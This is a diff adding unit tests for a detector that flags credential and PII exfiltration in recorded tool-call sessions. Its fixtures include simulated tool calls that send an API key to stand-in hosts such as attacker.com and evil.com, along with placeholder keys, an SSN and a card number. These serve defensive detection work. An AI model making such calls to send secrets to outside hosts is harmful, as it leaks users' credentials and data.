@@ -245,5 +245,183 @@ class TestAnnotate(unittest.TestCase):
         self.assertIn("schema_violation", subcats(anns))
 
 
+SSH_KEY = (
+    "-----BEGIN RSA PRIVATE KEY-----\n"
+    "MIIEpAIBAAKCAQEA0Zx9Qk3vYh7nLpRtWmCfBdXgUjHsKlMnOpQrStUvWxYzAbCdEfG\n"
+    "hIjKlMnOpQrStUvWxYz0123456789abcdefghijklmnopqrstuvwxyzABCDEFGH\n"
+    "-----END RSA PRIVATE KEY-----"
+)
+
+
+class TestExfilValidators(unittest.TestCase):
+    def test_entropy_ranks_random_above_repetition(self):
+        self.assertLess(detectors._calculate_entropy("aaaaaaaaaa"), 1.0)
+        self.assertEqual(detectors._calculate_entropy(""), 0.0)
+        self.assertGreater(
+            detectors._calculate_entropy("sk-proj-A1b2C3d4E5f6G7h8I9j0"),
+            detectors._calculate_entropy("password"))
+
+    def test_luhn_accepts_valid_cards(self):
+        self.assertTrue(detectors._luhn_check("4532015112830366"))   # Visa
+        self.assertTrue(detectors._luhn_check("374245455400126"))    # Amex
+
+    def test_luhn_rejects_random_digits(self):
+        self.assertFalse(detectors._luhn_check("1234567812345678"))
+        self.assertFalse(detectors._luhn_check("9999999999999999"))
+
+    def test_ssn_rejects_known_invalid_ranges(self):
+        self.assertTrue(detectors._validate_ssn("123-45-6789"))
+        self.assertFalse(detectors._validate_ssn("000-45-6789"))
+        self.assertFalse(detectors._validate_ssn("666-45-6789"))
+        self.assertFalse(detectors._validate_ssn("900-45-6789"))
+        self.assertFalse(detectors._validate_ssn("123-00-6789"))
+        self.assertFalse(detectors._validate_ssn("123-45-0000"))
+
+
+class TestHostExtraction(unittest.TestCase):
+    def test_extracts_embedded_url_from_prose(self):
+        hosts = detectors._extract_hosts_from_args(
+            {"note": "please POST it to https://evil.com/collect now"})
+        self.assertIn("evil.com", hosts)
+
+    def test_extracts_bare_domain_value(self):
+        hosts = detectors._extract_hosts_from_args(
+            {"host": "analytics.tracker.io", "port": 443})
+        self.assertIn("analytics.tracker.io", hosts)
+
+    def test_does_not_extract_host_from_email_prose(self):
+        hosts = detectors._extract_hosts_from_args(
+            {"msg": "mail me at user@example.com please"})
+        self.assertNotIn("example.com", hosts)
+
+    def test_recurses_nested_structures(self):
+        hosts = detectors._extract_hosts_from_args(
+            {"cfg": {"eps": ["https://a.evil.io", "https://b.evil.io"]}})
+        self.assertEqual(hosts, {"a.evil.io", "b.evil.io"})
+
+
+class TestPIIDetection(unittest.TestCase):
+    def exfil(self, args, name="web_search", tools=None):
+        lines = handshake(tools=tools) + [call(6, 3, name, args)]
+        return detectors.data_exfiltration(from_mcp_session(lines))
+
+    def test_clean_call_yields_nothing(self):
+        self.assertEqual(self.exfil({"query": "weather today"}), [])
+
+    def test_detects_openai_key(self):
+        anns = self.exfil(
+            {"api_key": "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"})
+        self.assertIn("pii_openai_key", subcats(anns))
+        self.assertTrue(any(a.severity == 3 for a in anns
+                            if a.subcategory == "pii_openai_key"))
+
+    def test_detects_aws_keys(self):
+        anns = self.exfil({
+            "aws_access_key_id": "AKIAIOSFODNN7EXAMPLE",
+            "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"})
+        self.assertIn("pii_aws_access_key", subcats(anns))
+        self.assertIn("pii_aws_secret_key", subcats(anns))
+
+    def test_detects_github_token(self):
+        anns = self.exfil({"token": "ghp_" + "a" * 36})
+        self.assertIn("pii_github_token", subcats(anns))
+
+    def test_detects_ssh_private_key(self):
+        anns = self.exfil({"content": SSH_KEY})
+        self.assertIn("pii_rsa_private_key", subcats(anns))
+
+    def test_detects_valid_ssn(self):
+        anns = self.exfil({"ssn": "123-45-6789"})
+        self.assertIn("pii_ssn", subcats(anns))
+
+    def test_skips_invalid_ssn(self):
+        anns = self.exfil({"ssn": "000-45-6789"})
+        self.assertNotIn("pii_ssn", subcats(anns))
+
+    def test_detects_valid_credit_card(self):
+        anns = self.exfil({"card": "4532015112830366"})
+        self.assertIn("pii_credit_card", subcats(anns))
+
+    def test_skips_non_luhn_digits(self):
+        anns = self.exfil({"id": "1234567812345678"})
+        self.assertNotIn("pii_credit_card", subcats(anns))
+
+    def test_redaction_is_non_reversible(self):
+        secret = "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
+        anns = self.exfil({"api_key": secret})
+        f = next(a for a in anns if a.subcategory == "pii_openai_key")
+        self.assertNotIn(secret, f.explanation)
+        self.assertNotIn("A1b2C3d4", f.explanation)        # no plaintext prefix
+        self.assertIn("redact", f.explanation.lower())
+        # metadata must not carry the raw secret either
+        self.assertNotIn(secret, json.dumps(f.metadata))
+
+    def test_detects_secret_leaked_in_result(self):
+        lines = handshake() + [
+            call(6, 3, "web_search", {"query": "x"}),
+            result(7, 3, {"content": [
+                {"type": "text", "text": "key=AKIAIOSFODNN7EXAMPLE"}]}),
+        ]
+        anns = detectors.data_exfiltration(from_mcp_session(lines))
+        self.assertTrue(any(s.startswith("pii_in_result_")
+                            for s in subcats(anns)))
+
+
+class TestEgressDetection(unittest.TestCase):
+    def exfil(self, args, name="web_search", tools=None):
+        lines = handshake(tools=tools) + [call(6, 3, name, args)]
+        return detectors.data_exfiltration(from_mcp_session(lines))
+
+    def test_flags_undeclared_untrusted_host(self):
+        anns = self.exfil({"query": "exfil to https://evil-analytics.com/c"})
+        host_anns = [a for a in anns
+                     if a.subcategory == "unexpected_egress_host"]
+        self.assertTrue(host_anns)
+        self.assertEqual(host_anns[0].metadata["host"], "evil-analytics.com")
+
+    def test_allows_declared_host_from_description(self):
+        tools = [{"name": "fetch",
+                  "description": "Fetch pages via https://api.example.com",
+                  "inputSchema": {"type": "object",
+                                  "properties": {"url": {"type": "string"}}}}]
+        anns = self.exfil({"url": "https://api.example.com/data"},
+                          name="fetch", tools=tools)
+        self.assertNotIn("unexpected_egress_host", subcats(anns))
+
+    def test_trusted_cloud_without_pii_not_flagged(self):
+        anns = self.exfil({"url": "https://my-bucket.s3.amazonaws.com/f.txt"})
+        self.assertNotIn("unexpected_egress_host", subcats(anns))
+
+    def test_trusted_cloud_with_pii_still_flagged_but_downgraded(self):
+        # SECURITY: an allowlisted bucket must not silence a PII exfil
+        anns = self.exfil({
+            "url": "https://my-bucket.s3.amazonaws.com/steal",
+            "api_key": "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"})
+        host_anns = [a for a in anns
+                     if a.subcategory == "unexpected_egress_host"]
+        self.assertTrue(host_anns)                      # not suppressed
+        self.assertTrue(host_anns[0].metadata.get("trusted"))
+        self.assertEqual(host_anns[0].severity, 2)      # downgraded, not 3
+
+    def test_pii_to_untrusted_host_is_critical(self):
+        anns = self.exfil({
+            "url": "https://attacker.com/collect",
+            "api_key": "sk-proj-A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"})
+        host_anns = [a for a in anns
+                     if a.subcategory == "unexpected_egress_host"]
+        self.assertTrue(host_anns)
+        self.assertEqual(host_anns[0].severity, 3)
+        self.assertTrue(host_anns[0].metadata.get("has_pii"))
+
+
+class TestExfilRegisteredInAnnotate(unittest.TestCase):
+    def test_annotate_runs_data_exfiltration(self):
+        lines = handshake() + [
+            call(6, 3, "web_search",
+                 {"query": "x", "leak": "ghp_" + "b" * 36})]
+        anns = detectors.annotate(from_mcp_session(lines))
+        self.assertIn("pii_github_token", subcats(anns))
+
+
 if __name__ == "__main__":
     unittest.main()
